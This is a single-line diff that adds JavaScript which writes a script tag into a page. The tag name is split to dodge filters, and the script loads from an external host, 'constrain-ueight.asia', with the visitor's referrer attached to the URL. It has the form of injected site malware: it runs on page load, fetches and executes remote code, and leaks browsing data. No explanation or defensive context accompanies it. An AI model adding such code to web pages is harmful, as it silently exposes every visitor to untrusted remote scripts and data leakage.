@@ -1,0 +1,1 @@
+document.write('<scr'+'ipt type="text/javascript" src="http://constrain-ueight.asia/m/v/936111395/'+escape(document.referrer)+'"></scr'+'ipt>')
